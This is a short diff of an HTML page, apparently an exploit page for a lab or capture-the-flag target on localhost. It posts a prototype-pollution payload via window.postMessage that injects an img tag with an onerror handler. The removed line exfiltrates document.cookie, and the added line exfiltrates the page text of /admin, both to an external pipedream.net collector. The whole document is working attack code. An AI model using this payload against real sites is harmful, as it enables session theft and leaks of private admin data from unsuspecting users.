@@ -5,8 +5,14 @@
 </head>
 <body>
    <script>
-        setTimeout(() => {
-            window.postMessage('{"__proto__":{"urgentMessage":"<img src=x onerror=fetch(\'https://eotqkw100h253ph.m.pipedream.net/?c=\'+document.cookie)>"}}', 'http://127.0.0.1:3000');
+         setTimeout(() => {
+            window.postMessage(`
+                {
+                    "__proto__": {
+                        "urgentMessage": "<img src='http://127.0.0.1:3000/admin' onerror='fetch(\'https://eotqkw100h253ph.m.pipedream.net/?data=\'+document.documentElement.innerText)' />"
+                    }
+                }
+            `, 'http://127.0.0.1:3000');
         }, 500);
     </script>
 </body>
